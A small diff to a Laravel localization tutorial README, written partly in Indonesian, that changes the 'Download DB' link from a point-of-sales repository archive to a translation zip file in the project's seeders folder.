@@ -4,7 +4,7 @@ Studi kasus cara mengimplementasikan laravel localization pada website baik itu 
 
 ## Download DB
 
-[Link](https://github.com/sandinur157/tuturial-membuat-aplikasi-point-of-sales/archive/refs/heads/main.zip)
+[Link](https://github.com/sandinur157/laravel-localization/blob/main/database/seeders/w2_translation.zip)
 
 ## Link Tutorial
 
